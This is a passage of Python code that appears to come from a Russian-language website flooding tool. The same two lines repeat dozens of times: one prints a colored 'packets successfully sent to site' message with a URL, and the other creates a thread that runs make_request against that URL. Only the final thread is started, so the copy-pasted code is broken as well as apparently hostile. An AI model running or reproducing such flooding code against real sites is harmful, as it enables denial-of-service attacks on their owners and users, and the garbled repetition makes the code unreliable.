    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    
    t.start()
    
